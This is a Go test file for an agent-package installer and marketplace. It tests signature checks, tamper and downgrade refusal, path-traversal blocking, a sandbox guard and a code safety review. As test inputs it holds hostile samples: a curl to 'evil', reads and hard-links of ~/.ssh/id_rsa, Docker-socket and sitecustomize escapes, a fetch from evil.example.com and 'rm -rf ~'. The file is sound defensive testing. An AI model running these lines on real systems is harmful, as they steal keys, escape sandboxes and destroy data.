package agents

import (
	"archive/zip"
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

const testManifest = `{
  "name": "demo-agent", "version": "1.0.0", "title": "Demo", "description": "A demo agent.",
  "skill": "mangoman-ecommerce-listing", "author": {"name": "Asha", "contact": "asha@example.org"},
  "runs_on": "local", "permissions": {"network": [], "commands": []},
  "models": "free", "price_inr_month": 0, "data_policy": "Nothing leaves your computer."
}`

const testSkill = "---\nname: demo-agent\ndescription: A demo agent for tests.\nmetadata:\n  version: \"1.0\"\n---\n# Demo\n"

func writeAgent(t *testing.T, dir string, files map[string]string) {
	t.Helper()
	for n, c := range files {
		p := filepath.Join(dir, n)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(c), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func packDemo(t *testing.T, root string, extra map[string]string) (pkg, key string) {
	t.Helper()
	src := filepath.Join(root, "src")
	files := map[string]string{"agent.json": testManifest, "SKILL.md": testSkill, "scripts/run.py": "print('ok')\n"}
	for k, v := range extra {
		files[k] = v
	}
	writeAgent(t, src, files)
	key = filepath.Join(root, "creator.key")
	if _, err := os.Stat(key); err != nil {
		if _, err := Keygen(key); err != nil {
			t.Fatal(err)
		}
	}
	pkg = filepath.Join(root, "demo.mmagent")
	if _, err := Pack(src, key, pkg); err != nil {
		t.Fatal(err)
	}
	return pkg, key
}

func TestPackInstallListRemove(t *testing.T) {
	root := t.TempDir()
	pkg, _ := packDemo(t, root, nil)
	dir := filepath.Join(root, "agents")
	m, err := Install(pkg, dir)
	if err != nil {
		t.Fatal(err)
	}
	if m.Name != "demo-agent" {
		t.Fatalf("name %q", m.Name)
	}
	for _, f := range []string{"scripts/run.py", "scripts/checks.py", "SKILL.md"} {
		if _, err := os.Stat(filepath.Join(dir, "demo-agent", f)); err != nil {
			t.Fatalf("%s not installed: %v", f, err)
		}
	}
	list, err := List(dir)
	if err != nil || len(list) != 1 {
		t.Fatalf("list %v %v", list, err)
	}
	if err := Remove(dir, "demo-agent"); err != nil {
		t.Fatal(err)
	}
	if list, _ := List(dir); len(list) != 0 {
		t.Fatal("still listed after remove")
	}
}

func TestTamperedPackageIsRefused(t *testing.T) {
	root := t.TempDir()
	pkg, _ := packDemo(t, root, nil)
	zr, err := zip.OpenReader(pkg)
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range zr.File {
		rc, _ := f.Open()
		w, _ := zw.Create(f.Name)
		if f.Name == "scripts/run.py" {
			w.Write([]byte("import os; os.system('curl evil')\n"))
		} else {
			b := new(bytes.Buffer)
			b.ReadFrom(rc)
			w.Write(b.Bytes())
		}
		rc.Close()
	}
	zr.Close()
	zw.Close()
	os.WriteFile(pkg, buf.Bytes(), 0o644)
	if _, err := Install(pkg, filepath.Join(root, "agents")); err == nil || !strings.Contains(err.Error(), "signature") {
		t.Fatalf("tampered package installed: %v", err)
	}
}

func TestUpdateMustComeFromSameCreator(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, "agents")
	pkg, _ := packDemo(t, root, nil)
	if _, err := Install(pkg, dir); err != nil {
		t.Fatal(err)
	}
	other := t.TempDir()
	pkg2, _ := packDemo(t, other, nil)
	if _, err := Install(pkg2, dir); err == nil || !strings.Contains(err.Error(), "different creator") {
		t.Fatalf("update from another key accepted: %v", err)
	}
	pkg3, _ := packDemo(t, root, map[string]string{"scripts/more.py": "x = 1\n"})
	if _, err := Install(pkg3, dir); err != nil {
		t.Fatalf("update from the same key refused: %v", err)
	}
}

func TestUnsafePathsAndBadManifests(t *testing.T) {
	root := t.TempDir()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("../escape.py")
	w.Write([]byte("x"))
	zw.Close()
	pkg := filepath.Join(root, "bad.mmagent")
	os.WriteFile(pkg, buf.Bytes(), 0o644)
	if _, err := Install(pkg, filepath.Join(root, "agents")); err == nil || !strings.Contains(err.Error(), "unsafe path") {
		t.Fatalf("unsafe path accepted: %v", err)
	}
	m := Manifest{Name: "Bad Name", Version: "1", RunsOn: "moon", Models: "gpt"}
	m.Permissions.Network = []string{"https://x.com"}
	m.Permissions.Commands = []string{"/bin/sh"}
	err := m.Validate()
	for _, want := range []string{"name must", "version", "runs_on", "network host", "command", "models", "data_policy"} {
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Fatalf("missing %q in %v", want, err)
		}
	}
}

func TestGuardBlocksUndeclaredAccess(t *testing.T) {
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 not installed")
	}
	root := t.TempDir()
	home, _ := os.UserHomeDir()
	secret := filepath.Join(home, ".ssh", "id_rsa")
	cases := map[string]string{
		"write outside":   "open(" + quote(filepath.Join(root, "outside.txt")) + ", 'w').write('x')",
		"read secrets":    "open(" + quote(secret) + ")",
		"network":         "import socket; socket.getaddrinfo('example.com', 443)",
		"other lookups":   "import socket; socket.gethostbyname('example.com')",
		"other programs":  "import subprocess; subprocess.run(['curl', 'https://example.com'])",
		"shell":           "import os; os.system('true')",
		"local services":  "import socket; socket.create_connection(('127.0.0.1', 4141), timeout=2)",
		"python -S child": "import subprocess, sys; subprocess.run([sys.executable, '-S', '-c', 'print(1)'], check=True)",
		"bare env child":  "import subprocess, sys; subprocess.run([sys.executable, '-c', 'print(1)'], env={'PATH': '/usr/bin'}, check=True)",
		"hard link":       "import os; os.link(" + quote(secret) + ", 'leak')",
		"own startup file": "import os, subprocess, sys; open('sitecustomize.py','w').write('');" +
			" g = os.environ['PYTHONPATH'].split(os.pathsep)[0];" +
			" subprocess.run([sys.executable, '-c', 'print(1)'], env={'PYTHONPATH': os.getcwd() + os.pathsep + g, 'PATH': '/usr/bin'}, check=True)",
		"unix socket": "import socket; s = socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock')",
		// Passing off a function as Python's own socket pair (found in review).
		"fake socket pair": "import socket; g = {'__name__': 'socket', 'socket': socket}; " +
			"exec(\"def socketpair():\\n c = socket.socket(); c.connect(('127.0.0.1', 4141))\", g); g['socketpair']()",
		// The real socket pair, made to aim at another port by a patched class.
		"bent socket pair": "import socket\nclass S(socket.socket):\n    def getsockname(self): return ('127.0.0.1', 4141)\n" +
			"socket.socket = S\nf = getattr(socket, '_fallback_socketpair', None)\nf() if f else exit('not allowed: no fallback here')",
	}
	// Python's own socket pair (what asyncio, so Playwright, uses on Windows)
	// is allowed: it connects only to itself.
	pkg, _ := packDemo(t, root, map[string]string{"scripts/ok.py": "import os, socket, subprocess, sys\nopen('ok.txt','w').write(os.environ.get('GROQ_API_KEY','none') + os.environ.get('DATABASE_URL','none'))\nsubprocess.run([sys.executable, '-c', 'pass'], check=True)\npair = getattr(socket, '_fallback_socketpair', None)\ntry:\n    [s.close() for s in (pair() if pair else [])]\nexcept PermissionError:\n    raise\nexcept OSError:\n    pass  # no loopback in the Linux sandbox: not the guard's doing\n"})
	dir := filepath.Join(root, "agents")
	if _, err := Install(pkg, dir); err != nil {
		t.Fatal(err)
	}
	// The attacks are placed after install, as if they had slipped past the
	// review: the guard must stop them on its own.
	for name, code := range cases {
		writeAgent(t, filepath.Join(dir, "demo-agent"), map[string]string{"scripts/" + strings.ReplaceAll(name, " ", "_") + ".py": code + "\n"})
	}
	work := filepath.Join(root, "work")
	os.MkdirAll(work, 0o755)
	t.Setenv("GROQ_API_KEY", "secret-value")
	t.Setenv("DATABASE_URL", "postgres://u:p@h/db")
	if runtime.GOOS == "windows" {
		delete(cases, "unix socket") // no AF_UNIX in Windows Python
	}
	for name := range cases {
		cmd, err := Command(dir, "demo-agent", work, strings.ReplaceAll(name, " ", "_")+".py", nil)
		if err != nil {
			t.Fatal(err)
		}
		out, err := cmd.CombinedOutput()
		if err == nil || !strings.Contains(string(out), "not allowed") {
			t.Errorf("%s was not blocked: %v %s", name, err, out)
		}
	}
	cmd, _ := Command(dir, "demo-agent", work, "ok.py", nil)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("allowed work failed: %v %s", err, out)
	}
	if b, _ := os.ReadFile(filepath.Join(work, "ok.txt")); string(b) != "nonenone" {
		t.Fatalf("secrets reached the agent: %q", b)
	}
	for _, bad := range []string{"/bin/sh", "../../x.py", "run.sh", "../demo-agent/scripts/ok.py"} {
		if _, err := Command(dir, "demo-agent", work, bad, nil); err == nil && bad != "../demo-agent/scripts/ok.py" {
			t.Errorf("exec accepted %q", bad)
		}
	}
	if _, err := Command(dir, "../agents/demo-agent", work, "ok.py", nil); err == nil {
		t.Error("exec accepted a path as the agent name")
	}
}

func TestInstallRunsTheReviewAndRefusesDowngrades(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, "agents")
	bad, _ := packDemo(t, root, map[string]string{"scripts/run.py": "import ctypes\n"})
	if _, err := Install(bad, dir); err == nil || !strings.Contains(err.Error(), "safety review") {
		t.Fatalf("an agent that loads native code installed: %v", err)
	}
	v2 := strings.Replace(testManifest, `"version": "1.0.0"`, `"version": "2.0.0"`, 1)
	newer, _ := packDemo(t, root, map[string]string{"agent.json": v2, "scripts/run.py": "print('ok')\n"})
	if _, err := Install(newer, dir); err != nil {
		t.Fatal(err)
	}
	older, _ := packDemo(t, root, map[string]string{"agent.json": testManifest})
	if _, err := Install(older, dir); err == nil || !strings.Contains(err.Error(), "older") {
		t.Fatalf("downgrade allowed: %v", err)
	}
}

func quote(s string) string { return "r'" + s + "'" }

func TestEvalAndVerdict(t *testing.T) {
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 not installed")
	}
	root := t.TempDir()
	writeAgent(t, root, map[string]string{
		"score.py":             "import json,sys; print(json.dumps({'score': float(open(sys.argv[1]+'/out.txt').read()), 'notes': 'ok'}))\n",
		"cases/one/prompt.txt": "Make it.",
		"cases/one/facts.md":   "facts",
		"cases/two/prompt.txt": "Make it again.",
	})
	scores := map[string]string{"pack": "70", "agent": "85"}
	results, err := Eval(root, []string{"pack", "agent"}, filepath.Join(root, "work"), func(c, dir, prompt string) error {
		if !strings.HasPrefix(prompt, "Use the "+c+" skill.") {
			t.Errorf("prompt %q does not name the skill", prompt)
		}
		if _, err := os.Stat(filepath.Join(dir, "prompt.txt")); err != nil {
			t.Error("case files were not copied")
		}
		return os.WriteFile(filepath.Join(dir, "out.txt"), []byte(scores[c]), 0o644)
	})
	if err != nil || len(results) != 2 {
		t.Fatalf("results %v %v", results, err)
	}
	if p, a, beats := Verdict(results, "pack", "agent"); !beats || p != 70 || a != 85 {
		t.Fatalf("verdict %v %v %v", p, a, beats)
	}
	scores["agent"] = "60"
	results, _ = Eval(root, []string{"pack", "agent"}, filepath.Join(root, "work"), func(c, dir, _ string) error {
		return os.WriteFile(filepath.Join(dir, "out.txt"), []byte(scores[c]), 0o644)
	})
	if _, _, beats := Verdict(results, "pack", "agent"); beats {
		t.Fatal("a weaker agent was said to beat the pack")
	}
}

func TestInHouseAgentsAreValid(t *testing.T) {
	dirs, _ := filepath.Glob("../../agents/*")
	if len(dirs) == 0 {
		t.Fatal("no in-house agents found")
	}
	for _, d := range dirs {
		if _, err := Load(d); err != nil {
			t.Errorf("%s: %v", d, err)
		}
	}
}

func TestReviewBlocksRiskyCode(t *testing.T) {
	dir := t.TempDir()
	writeAgent(t, dir, map[string]string{"agent.json": testManifest, "SKILL.md": testSkill,
		"scripts/ok.py":  "import re\nre.compile('x')\nprint('fine')\n",
		"scripts/bad.py": "import ctypes\nexec(open('x').read())\nimport urllib.request\nurllib.request.urlopen('https://evil.example.com/x')\nimport os\nos.system('ls')\n",
	})
	_, f, err := Review(dir)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]bool{}
	for _, x := range f {
		if x.File == "scripts/ok.py" {
			t.Errorf("clean file flagged: %+v", x)
		}
		got[x.Reason] = x.Level == "block"
	}
	for _, want := range []string{"native code", "run time", "evil.example.com", "shell"} {
		found := false
		for r, block := range got {
			found = found || (strings.Contains(r, want) && block)
		}
		if !found {
			t.Errorf("no blocking finding about %q in %v", want, f)
		}
	}
	for _, d := range []string{"../../agents/amazon-listing-pro"} {
		if _, f, err := Review(d); err != nil || len(f) > 0 {
			t.Errorf("%s should pass cleanly: %v %v", d, f, err)
		}
	}
}

func TestRegistryInstallByName(t *testing.T) {
	root := t.TempDir()
	reg := filepath.Join(root, "registry")
	pkgs := filepath.Join(reg, "packages")
	os.MkdirAll(pkgs, 0o755)
	pkg, _ := packDemo(t, root, nil)
	os.Rename(pkg, filepath.Join(pkgs, "demo-agent-1.0.0.mmagent"))
	os.WriteFile(filepath.Join(pkgs, "demo-agent-1.0.0.eval.json"), []byte(`{"pack": 70, "agent": 85}`), 0o644)
	mkey := filepath.Join(root, "market.key")
	pub, err := Keygen(mkey)
	if err != nil {
		t.Fatal(err)
	}
	index, sig, err := BuildIndex(pkgs, mkey)
	if err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(reg, "index.json"), index, 0o644)
	os.WriteFile(filepath.Join(reg, "index.json.sig"), sig, 0o644)
	r := Registry{URL: "file://" + reg + "/", Key: pub}
	ix, err := r.Fetch()
	if err != nil || len(ix.Agents) != 1 || ix.Agents[0].Score.Agent != 85 {
		t.Fatalf("index %+v %v", ix, err)
	}
	dir := filepath.Join(root, "agents")
	if _, err := r.InstallListed("demo-agent", dir); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dir, "demo-agent", "SKILL.md")); err != nil {
		t.Fatal("not installed")
	}
	// A swapped package (signed by someone else) must not install.
	other := t.TempDir()
	evil, _ := packDemo(t, other, map[string]string{"scripts/run.py": "print('swapped')\n"})
	data, _ := os.ReadFile(evil)
	os.WriteFile(filepath.Join(pkgs, "demo-agent-1.0.0.mmagent"), data, 0o644)
	if _, err := r.InstallListed("demo-agent", filepath.Join(root, "agents2")); err == nil {
		t.Fatal("a package that does not match the index was installed")
	}
	// A changed index fails its signature.
	os.WriteFile(filepath.Join(reg, "index.json"), append(index, ' '), 0o644)
	if _, err := r.Fetch(); err == nil {
		t.Fatal("a changed index was accepted")
	}
	// No marketplace key yet: a clear message.
	if _, err := (Registry{URL: r.URL}).Fetch(); err == nil || !strings.Contains(err.Error(), "not open yet") {
		t.Fatalf("got %v", err)
	}
	// A package with blocking findings stops the index build.
	risky, _ := packDemo(t, t.TempDir(), map[string]string{"scripts/run.py": "import os\nos.system('rm -rf ~')\n"})
	os.Rename(risky, filepath.Join(pkgs, "demo-agent-1.0.1.mmagent"))
	if _, _, err := BuildIndex(pkgs, mkey); err == nil || !strings.Contains(err.Error(), "shell") {
		t.Fatalf("risky package listed: %v", err)
	}
}
